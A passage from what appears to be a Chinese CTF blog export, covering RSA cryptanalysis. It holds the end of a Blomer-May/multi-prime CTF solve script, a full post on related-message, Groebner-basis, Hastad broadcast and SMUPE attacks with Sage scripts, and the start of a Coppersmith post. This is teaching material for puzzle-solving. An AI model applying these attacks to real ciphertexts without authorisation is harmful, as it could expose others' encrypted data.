     base *= (<span class="number">1</span>-f(primes[i]))</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span>  <span class="comment"># calculate the series of continued fraction</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span>  <span class="comment"># calculate the convergent series of continued fraction</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># 分母</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Blomer_May_attack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    quotients = rational_to_quotients(e, n)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (_x, _y) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> _x != <span class="number">0</span>:</span><br><span class="line">            T = n + <span class="number">1</span> - (e * _y) // _x</span><br><span class="line">            <span class="keyword">if</span> T ** <span class="number">2</span> - <span class="number">4</span> * n &gt; <span class="number">0</span>:</span><br><span class="line">                tmp_p = (T + int(iroot(T ** <span class="number">2</span> - <span class="number">4</span> * n, <span class="number">2</span>)[<span class="number">0</span>])) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-2</span>**<span class="number">5</span>, <span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">                    _p = tmp_p + i</span><br><span class="line">                    <span class="keyword">if</span> n &gt; _p &gt; <span class="number">1</span> <span class="keyword">and</span> n % _p == <span class="number">0</span>:</span><br><span class="line">                        print(<span class="string">'Got solution!'</span>)</span><br><span class="line">                        _q = n//_p</span><br><span class="line">                        <span class="keyword">return</span> _p, _q</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'No solution'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_ascii</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">primes = [<span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503118559</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503126443</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503193349</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503562289</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503734189</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503760301</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503782813</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503951191</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504074953</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504107911</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504191461</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504448729</span>, <span class="number">6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504539989</span>]</span><br><span class="line">c = <span class="number">84010209207136400037674900630630399007540527378939350615722225527845587559010102178617103738600464258190430641037546648203366413208680794400023737381999928100638870193135477985407368386033167118399673001236960699550393986712868487827560601610546135335952667201927052409197291462799539018091792246183307678928298241645258411316936304167124933556606198943248215284393941957893610109127025761289673484220381931928088574316265497075872825588843686573267223321714224535003053507039588501110165036609252972283465620670619170664971316238808580562960566239652372002792893860381585262550998380705474210656337505369024906108022045918104803080765059727578165530772500933465284347893453376016683018177839155666453880461050298815103588796089076127048997409337740340488597725920421812209214132626919132717242722587461710190518049279845280531076833361229586237230905386909567570882397978261647980071794688572393137428928552335623610968045342130104152766075095859252589558838654095036476181115093298573203118822557283958028992348972004110923680696213759378910314691270631431638964147123334674</span></span><br><span class="line">index = [<span class="number">17</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">3</span>]</span><br><span class="line">_e = <span class="number">372077403420031165815439199213704344304928202869941592969972103002464355333911024937074871410825817568355544126574173758702600945390438495248751733573391345292294888885607465578329781858741122278411513362633310583564023669185613282939355138576537165757775740881908805743008022348524049466231348651228609449357106436669219</span></span><br><span class="line">_n = <span class="number">470335762637936005588762180827192207993663594416060284974932410896705386687847439702920143090437462997342000428130417147164245577372958674672171462397851600930104979198327224831772288314005311036009419876584852939180439595289349509330868790367408195151323961061772542485151690708678904080061050887466315542337191307236199</span></span><br><span class="line">_c = <span class="number">333271281173306446630548720678701979402616631681988817880871964537046235416970583988475783551455814258102380169630603934095599959443467742430556704688855518165068592402751863811686579302153371106333344752494076921552527417915731880831363624299780159503812111855009880750695443491602523883753510968162389168190126033304497</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_p, _q = Blomer_May_attack(_e, _n)</span><br><span class="line">_phi = (_p<span class="number">-1</span>) * (_q<span class="number">-1</span>)</span><br><span class="line">_d = inverse(_e, _phi)</span><br><span class="line">e = pow(_c, _d, _n)</span><br><span class="line"></span><br><span class="line">tmp = list(itertools.combinations(primes, <span class="number">7</span>))</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> tqdm(tmp):</span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</span><br><span class="line">        phi *= j<span class="number">-3</span></span><br><span class="line">    n = -combine_check(l)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(pow(c, d, n))</span><br><span class="line">    <span class="keyword">if</span> all_ascii(flag):</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 9e519e65a9a492c10f31d4296699f00f</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的RSA基本套路(4)</title>
    <url>/2decc525.html</url>
    <content><![CDATA[<blockquote><p>第四部分是相关消息的内容</p></blockquote><p>依赖库：</p><ul><li>gmpy2</li><li>pycrypto</li><li>pwntools</li><li>sage</li></ul><a id="more"></a><h2><span id="pxian-xing-xiang-guan-xiao-xi">线性相关消息</span><a href="#pxian-xing-xiang-guan-xiao-xi" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>这是相关消息攻击最简单的一种形式，已知$c_1 = m_1 ^ e \mod N,c_2 = (am_1+b)^e \mod N，m_2 = am_1+b$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>可以看到两次加密的消息$m_1$和$m_2$存在线性关系，当$e=3$时，根据推导(见《Low-Exponent RSA with Related Messages》)，可以得到以下关系</p><p>$m_{1}=\frac{b}{a} \frac{c_{2}+2 a^{3} c_{1}-b 3}{c_{2}-a^{3} c_{1}+2 b^{3}}$，因此可以根据已知的$c_1、c_2、a、b$轻松得到消息$m_1$（注意，这里的除法是求逆元的意思）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python</span><br><span class="line">from gmpy2 import invert</span><br><span class="line">def getmessage(a, b, c1, c2, n):</span><br><span class="line">    b3 &#x3D; pow(b, 3, n)</span><br><span class="line">    a3 &#x3D; pow(a, 3, n)</span><br><span class="line">    part1 &#x3D; b * (c2 + 2 * c1 * a3 - b3) % n</span><br><span class="line">    part2 &#x3D; a * (c2 - c1 * a3 + 2 * b3) % n</span><br><span class="line">    part2 &#x3D; invert(part2, n)</span><br><span class="line">    return part1 * part2 % n</span><br></pre></td></tr></table></figure><h3><span id="pjin-jie">进阶</span><a href="#pjin-jie" class="header-anchor">#</a></h3><p>下面是论文中的通用情况，即$c_1= (a_1m+b_1)^e \mod n$，$c_2 = (a_2m+b_2)^e \mod n$，不通过前面推公式的方法，只需要通过$gcd$即可求得对应的消息。由于式子$(a_1m+b_1)^e - c_1 \mod n$和$(a_2m+b_2)^e -c_2 \mod n$都必然存在公共的$x-m$的根，因此通过$gcd$求得$x-m$，即可得到对应的消息$m$，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sage</span><br><span class="line">def gcd(g1, g2):</span><br><span class="line">    while g2:</span><br><span class="line">        g1, g2 &#x3D; g2, g1 % g2</span><br><span class="line">    return g1.monic()</span><br><span class="line">    </span><br><span class="line">n &#x3D; </span><br><span class="line">a1 &#x3D; </span><br><span class="line">b1 &#x3D; </span><br><span class="line">c1 &#x3D; </span><br><span class="line">a2 &#x3D; </span><br><span class="line">b2 &#x3D; </span><br><span class="line">e &#x3D; 3</span><br><span class="line">c2 &#x3D; PR.&lt;x&gt;&#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">g1 &#x3D; (a1*x+b1)^e-c1</span><br><span class="line">g2 &#x3D; (a2*x+b2)^e-c2</span><br><span class="line">print(-gcd(g1, g2)[0])</span><br></pre></td></tr></table></figure><h2><span id="pduo-xiao-xi-xiang-guan">多消息相关</span><a href="#pduo-xiao-xi-xiang-guan" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>假设存在$k$个消息，它们有关系式$P_0(x_1,x_2,…x_k)=p(x_1,x_2,…x_k) = 0 \mod N$</p><p>并且有$P_i(x_i)=x_i^e-c_i = 0 \mod N$，需要求解这$k$个消息</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>根据这$k+1$个等式，我们计算$Groebner$基$Groebner([P_0,P_1,…P_k])$，可以得到结果$[x_1-m_1,…x_k-m_k]$，</p><p>也就求得了所有的$k$个消息</p><p>以下举例论文中比较特殊的线性相关消息，即$P_0(x_1,x_2…x_k) = x_1+x_2+…x_k-w = 0 $</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python</span><br><span class="line">from Crypto.Util.number import getPrime, bytes_to_long</span><br><span class="line">p &#x3D; getPrime(512)</span><br><span class="line">q &#x3D; getPrime(512)</span><br><span class="line">n &#x3D; p * q</span><br><span class="line">e &#x3D; 3</span><br><span class="line">m1 &#x3D; bytes_to_long(b&quot;flag&#123;This_is_flag1&#125;&quot;)</span><br><span class="line">m2 &#x3D; bytes_to_long(b&quot;flag&#123;This_is_flag2&#125;&quot;)</span><br><span class="line">m3 &#x3D; m1+m2+10000</span><br><span class="line">print(n)</span><br><span class="line">print(pow(m1,e,n))</span><br><span class="line">print(pow(m2,e,n))</span><br><span class="line">print(pow(m3,e,n))</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">108684504406001730978107355065522913091470167674222436489722232508562878942265531378563853986279259519842855383477949581415300994618557266600557629814170912555530200441331549267805294484355321505430150563949802485514426432450612355535035910835277447960752175362457165729276266536456917482476441605301749223673</span><br><span class="line">11916677858912595626741303803048763073265062084232819699152039070779448603839943645221450568650559197753804295090892194306963679051905125</span><br><span class="line">11916677858912595626741303803048763073265066091036090039985967549263766666260772390533720397506805484501981105835442312723743004564263781</span><br><span class="line">95333422871300765013930430424390104586121138764086629711853351243347558333657355599432416841199469970564180649403376333107226365096683496</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>解的脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sage</span><br><span class="line">e &#x3D; 3</span><br><span class="line">cnt &#x3D; 3</span><br><span class="line">N&#x3D;108684504406001730978107355065522913091470167674222436489722232508562878942265531378563853986279259519842855383477949581415300994618557266600557629814170912555530200441331549267805294484355321505430150563949802485514426432450612355535035910835277447960752175362457165729276266536456917482476441605301749223673</span><br><span class="line">c1&#x3D;11916677858912595626741303803048763073265062084232819699152039070779448603839943645221450568650559197753804295090892194306963679051905125</span><br><span class="line">c2&#x3D;11916677858912595626741303803048763073265066091036090039985967549263766666260772390533720397506805484501981105835442312723743004564263781</span><br><span class="line">c3&#x3D;95333422871300765013930430424390104586121138764086629711853351243347558333657355599432416841199469970564180649403376333107226365096683496</span><br><span class="line">c &#x3D; [c1,c2,c3]</span><br><span class="line">PR &#x3D; PolynomialRing(Zmod(N), &#39;x&#39;, cnt)</span><br><span class="line">x &#x3D; PR.gens()</span><br><span class="line">F &#x3D; []</span><br><span class="line">for i in range(cnt):</span><br><span class="line">    F.append(pow(x[i],e)-c[i])</span><br><span class="line">F.append(x[0]+x[1]-x[2]+10000)</span><br><span class="line">I &#x3D; Ideal(F)</span><br><span class="line">G&#x3D; I.groebner_basis()</span><br><span class="line">for b in G[:-1]:</span><br><span class="line">    mi &#x3D; ZZ(-b(0, 0, 0))</span><br><span class="line">    print(bytes.fromhex(hex(mi)[2:]))</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">b&#39;flag&#123;This_is_flag1&#125;&#39;</span><br><span class="line">b&#39;flag&#123;This_is_flag2&#125;&#39;</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><h2><span id="phastad-gong-ji">Hastad 攻击</span><a href="#phastad-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>前面的两个相关消息攻击模数都是相同的，而在Hasted广播攻击中则不同</p><p>使用不同但互质的模数$n$，相同的指数$e$、加密$e$个明文得到$e$个密文，即$c_i = (a_ix+b_i)^e \mod n_i ,i=1,2…e$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>通过这$e$个式子，我们有$e$个等式：$(a_ix+b_i)^e -c_i \equiv 0 \mod n_i，i=1,2…e$</p><p>由于这$e$个式子中，模数都是互质的，那么通过中国剩余定理，我们可以得到$P(x) \equiv 0 \mod M，M=\prod_{i=1}^{e} n_i$，而$P(x)$又必然存在唯一解，并满足LLL算法约束，因此可以通过<code>sage</code>的<code>small_roots</code>函数解得，以下给出两个写法分别来自https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/hastads.sage和https://xz.aliyun.com/t/6813</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sage</span><br><span class="line">def linearPaddingHastads1(cArray, nArray, aArray, bArray, e&#x3D;3, eps&#x3D;1&#x2F;8):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Performs Hastads attack on raw RSA with no padding.</span><br><span class="line">    This is for RSA encryptions of the form: cArray[i] &#x3D; pow(aArray[i]*msg + bArray[i],e,nArray[i])</span><br><span class="line">    Where they are all encryptions of the same message.</span><br><span class="line">    cArray &#x3D; Ciphertext Array</span><br><span class="line">    nArray &#x3D; Modulus Array</span><br><span class="line">    aArray &#x3D; Array of &#39;slopes&#39; for the linear padding</span><br><span class="line">    bArray &#x3D; Array of &#39;y-intercepts&#39; for the linear padding</span><br><span class="line">    e &#x3D; public exponent</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if(len(cArray) &#x3D;&#x3D; len(nArray) &#x3D;&#x3D; len(aArray) &#x3D;&#x3D; len(bArray) &#x3D;&#x3D; e):</span><br><span class="line">        for i in range(e):</span><br><span class="line">            cArray[i] &#x3D; Integer(cArray[i])</span><br><span class="line">            nArray[i] &#x3D; Integer(nArray[i])</span><br><span class="line">            aArray[i] &#x3D; Integer(aArray[i])</span><br><span class="line">            bArray[i] &#x3D; Integer(bArray[i])</span><br><span class="line">        TArray &#x3D; [-1]*e</span><br><span class="line">        for i in range(e):</span><br><span class="line">            arrayToCRT &#x3D; [0]*e</span><br><span class="line">            arrayToCRT[i] &#x3D; 1</span><br><span class="line">            TArray[i] &#x3D; crt(arrayToCRT, nArray)</span><br><span class="line">        P.&lt;x&gt; &#x3D; PolynomialRing(Zmod(prod(nArray)))</span><br><span class="line">        gArray &#x3D; [-1]*e</span><br><span class="line">        for i in range(e):</span><br><span class="line">            gArray[i] &#x3D; TArray[i]*(pow(aArray[i]*x + bArray[i], e) - cArray[i])</span><br><span class="line">        g &#x3D; sum(gArray)</span><br><span class="line">        g &#x3D; g.monic()</span><br><span class="line">        # Use Sage&#39;s inbuilt coppersmith method</span><br><span class="line">        roots &#x3D; g.small_roots(epsilon&#x3D;eps)</span><br><span class="line">        if(len(roots) &#x3D;&#x3D; 0):</span><br><span class="line">            print(&quot;No Solutions found&quot;)</span><br><span class="line">            return -1</span><br><span class="line">        return roots[0]</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        print(&quot;CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length,&quot; +</span><br><span class="line">              &quot;and the same size as the public exponent&quot;)</span><br><span class="line"></span><br><span class="line">def linearPaddingHastads2(cArray, nArray, aArray, bArray, e&#x3D;3, eps&#x3D;1&#x2F;8):</span><br><span class="line">    cnt &#x3D; e</span><br><span class="line">    PR &#x3D; PolynomialRing(ZZ, &#39;x&#39;)</span><br><span class="line">    x &#x3D; PR.gen()</span><br><span class="line">    Fs &#x3D; []</span><br><span class="line">    for i in range(cnt):</span><br><span class="line">        f &#x3D; PR((A[i]*x + B[i])**e - Cs[i])</span><br><span class="line">        ff &#x3D; f.change_ring(Zmod(Ns[i]))</span><br><span class="line">        ff &#x3D; ff.monic()</span><br><span class="line">        f &#x3D; ff.change_ring(ZZ)</span><br><span class="line">        Fs.append(f)</span><br><span class="line"></span><br><span class="line">    F &#x3D; crt(Fs, Ns)</span><br><span class="line">    M &#x3D; reduce(lambda x, y: x * y, Ns)</span><br><span class="line">    FF &#x3D; F.change_ring(Zmod(M))</span><br><span class="line">    m &#x3D; FF.small_roots(epsilon&#x3D;1&#x2F;16)</span><br><span class="line">    if m:</span><br><span class="line">        return m[0]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br></pre></td></tr></table></figure><h2><span id="psmupe-wen-ti">SMUPE 问题</span><a href="#psmupe-wen-ti" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>在经历了模数相同的相关消息攻击，也看过了模数不同的Hastad攻击，但是我们的指数$e$始终是一致的，SMUPE问题是论文《Solving Systems of Modular Equations in One Variable: How Many RSA-Encrypted Messages Does Eve Need to Know? 》中提出的，不仅模数不同，且指数$e$也不同，具体如下：</p><p>假如我们有$k$个式子，$c_i = (a_ix+b_i)^{e_i} \mod n_i,i=1,2…k $，此时如何求解未知的消息呢</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>示例1：以论文中为例，已有4个公钥$(e,N)$分别为$(3,N_1),(3,N_2),(5,N_3),(5,N_4)$，且有$c_i = (a_ix+b_i)^{e_i} \mod N_i,i=1,2…4$</p><p>由于阶次不同，无法直接进行CRT，因此需要构造得到同阶次的式子进行CRT。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cs &#x3D; [...]</span><br><span class="line">PKs &#x3D;  [(3,..), (3,..), (5,..), (5,..)]</span><br><span class="line">cnt &#x3D; 4</span><br><span class="line">A &#x3D; []</span><br><span class="line">B &#x3D; []</span><br><span class="line">PR &#x3D; PolynomialRing(ZZ, &#39;x&#39;)</span><br><span class="line">x &#x3D; PR.gen()</span><br><span class="line"></span><br><span class="line">Fs &#x3D; []</span><br><span class="line">for i in range(cnt):</span><br><span class="line">    f &#x3D;  PR( ( A[i]*x + B[i] )**PKs[i][0] - Cs[i] )</span><br><span class="line">    ff &#x3D; f.change_ring( Zmod(PKs[i][1]) )</span><br><span class="line">    ff &#x3D; ff.monic()</span><br><span class="line">    f &#x3D; ff.change_ring(ZZ)</span><br><span class="line">    Fs.append(f)</span><br><span class="line">F &#x3D; crt( [ Fs[0]**2, Fs[1]**2, x*Fs[2], x*Fs[3] ], [ PKs[i][1] for i in range(cnt) ] )</span><br><span class="line"></span><br><span class="line">M &#x3D; reduce( lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )</span><br><span class="line">FF &#x3D; F.change_ring( Zmod(M) )</span><br><span class="line">m &#x3D; FF.small_roots(X&#x3D;2**760, beta&#x3D;7.&#x2F;8)[0]</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>示例2：</p><p>也是为了更加深入理解这个构造，在此示例中，$e$分别为2和3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c1 &#x3D; </span><br><span class="line">c2 &#x3D; </span><br><span class="line">a1 &#x3D; </span><br><span class="line">a2 &#x3D; </span><br><span class="line">b1 &#x3D; </span><br><span class="line">b2 &#x3D; </span><br><span class="line"></span><br><span class="line">Cs &#x3D; [c1, c2]</span><br><span class="line">A &#x3D; [a1, a2]</span><br><span class="line">B &#x3D; [b1, b2]</span><br><span class="line">cnt &#x3D; 2</span><br><span class="line">PKs &#x3D; [(2,n1), (3,n2)]</span><br><span class="line">PR &#x3D; PolynomialRing(ZZ, &#39;x&#39;)</span><br><span class="line">x &#x3D; PR.gen()</span><br><span class="line">Fs &#x3D; []</span><br><span class="line">for i in range(cnt):</span><br><span class="line">    f &#x3D;  PR( ( A[i]*x + B[i] )**PKs[i][0] - Cs[i] )</span><br><span class="line">    ff &#x3D; f.change_ring( Zmod(PKs[i][1]) )</span><br><span class="line">    ff &#x3D; ff.monic()</span><br><span class="line">    f &#x3D; ff.change_ring(ZZ)</span><br><span class="line">    Fs.append(f)</span><br><span class="line">F &#x3D; crt( [ Fs[0]*x, Fs[1]], [ PKs[i][1] for i in range(cnt) ] )</span><br><span class="line"></span><br><span class="line">M &#x3D; reduce( lambda x, y: x * y, [ PKs[i][1] for i in range(cnt) ] )</span><br><span class="line">FF &#x3D; F.change_ring( Zmod(M) )</span><br><span class="line">m &#x3D; FF.small_roots(epsilon&#x3D;1.0&#x2F;16)[0]</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>PS：<code>small_roots</code>的参数需要根据实际情况进行调整</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Let &#96;N&#96; be the characteristic of the base ring this polynomial</span><br><span class="line">  is defined over: &#96;&#96;N &#x3D; self.base_ring().characteristic()&#96;&#96;.</span><br><span class="line">  This method returns small roots of this polynomial modulo some</span><br><span class="line">  factor &#96;b&#96; of &#96;N&#96; with the constraint that &#96;b &gt;&#x3D; N^\beta&#96;.</span><br><span class="line">  Small in this context means that if &#96;x&#96; is a root of &#96;f&#96;</span><br><span class="line">  modulo &#96;b&#96; then &#96;|x| &lt; X&#96;. This &#96;X&#96; is either provided by the</span><br><span class="line">  user or the maximum &#96;X&#96; is chosen such that this algorithm</span><br><span class="line">  terminates in polynomial time. If &#96;X&#96; is chosen automatically</span><br><span class="line">  it is &#96;X &#x3D; ceil(1&#x2F;2 N^&#123;\beta^2&#x2F;\delta - \epsilon&#125;)&#96;.</span><br><span class="line">  The algorithm may also return some roots which are larger than &#96;X&#96;.</span><br><span class="line">  &#39;This algorithm&#39; in this context means Coppersmith&#39;s algorithm for finding</span><br><span class="line">  small roots using the LLL algorithm. The implementation of this algorithm</span><br><span class="line">  follows Alexander May&#39;s PhD thesis referenced below.</span><br><span class="line">  INPUT:</span><br><span class="line">  - &#96;&#96;X&#96;&#96; -- an absolute bound for the root (default: see above)</span><br><span class="line">  - &#96;&#96;beta&#96;&#96; -- compute a root mod &#96;b&#96; where &#96;b&#96; is a factor of &#96;N&#96; and &#96;b</span><br><span class="line">    \ge N^\beta&#96;. (Default: 1.0, so &#96;b &#x3D; N&#96;.)</span><br><span class="line">  - &#96;&#96;epsilon&#96;&#96; -- the parameter &#96;\epsilon&#96; described above. (Default: &#96;\beta&#x2F;8&#96;)</span><br><span class="line">  - &#96;&#96;**kwds&#96;&#96; -- passed through to method :meth:&#96;Matrix_integer_dense.LLL()</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-lian-jie">参考链接</span><a href="#pcan-kao-lian-jie" class="header-anchor">#</a></h2><ul><li><p><a href="https://xz.aliyun.com/t/6813#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/6813#toc-2</a></p></li><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/#related-message-attack" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/#related-message-attack</a></p></li><li><p><a href="https://link.springer.com/content/pdf/10.1007/3-540-68339-9_1.pdf" target="_blank" rel="noopener">Low-Exponent RSA with Related Messages</a></p></li><li><p><a href="https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/hastads.sage" target="_blank" rel="noopener">https://github.com/ValarDragon/CTF-Crypto/blob/master/RSA/hastads.sage</a></p></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的RSA基本套路(3)</title>
    <url>/62ad53e2.html</url>
    <content><![CDATA[<blockquote><p>第三部分是基本的Coppersmith相关内容</p></blockquote><p>依赖库：</p><ul><li>gmpy2</li><li>pycrypto</li><li>pwntools</li><li>sage</li></ul><a id="more"></a><h2><span id="pyin-zi">引子</span><a href="#pyin-zi" class="header-anchor">#</a></h2><p>$c=m^e \mod N$, 当 $|m| &lt; N^{1/e}$时，我们能很快求得$m$的值</p><p>当$|m|&gt;N^{1/e}$时，如果已知$m$的部分信息$m_0$，能不能恢复未知$x$的值，这就是$Corppersmith$ 要解决的问题</p><p>$$c = (m_0+x)^e \mod N$$</p><h2><span id="pyi-zhi-bu-fen-ming-wen-gong-ji">已知部分明文攻击</span><a href="#pyi-zhi-bu-fen-ming-wen-gong-ji" class="header-anchor">#</a></h2><p><strong>引理1</strong></p><p>假设$N$是一个未知因子组成的数，且存在一个因子$b \geq N^{\beta},0 \lt \beta \leq 1$,$f(x)$ 是一个一元$\delta$阶多项式，且$c \geq 1$，那么可以在$O(c\delta ^5 log^9(N))$复杂度内求解下列等式的所有的$x_0$</p><p>$$f(x)=0 \mod b, |x_0| \leq c N^{\beta ^2/\delta}$$</p><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>设$m=m_0 + x_0$，其中$x_0$是未知的，那么我们可以列出以下多项式</p><p>$$f(x)=(m_0+x)^e - c \mod N , f(x_0)=0$$</p><p>当$e$和$x_0$很小的时候，$Coppersmith$就能求出$x_0$的值</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>在这个场景中，我们知道$b=N,\delta=e,\beta=1$，设$c=1$，此时$|x_0| \leq c N^{\beta ^2/\delta} = N^{1/e}$，因此，为了求解$x_0$，我们需要知道原消息$m$至少<code>(1-1/e)​*N.bit_length()</code>比特的信息</p><p>碰到的最常见的是已知明文高位攻击，但其实未知的部分在哪里都可以，只要是连贯的，就能构造对应的$f(x)$进行求解</p><h4><span id="pyi-zhi-ming-wen-gao-wei">已知明文高位</span><a href="#pyi-zhi-ming-wen-gao-wei" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">n &#x3D; </span><br><span class="line">kbits &#x3D; # x的未知bit数目</span><br><span class="line">m0 &#x3D;  #明文的高位信息</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; (m0 + x)^e - c</span><br><span class="line">f &#x3D; f.monic()</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits,beta&#x3D;1)[0] # 在0 - 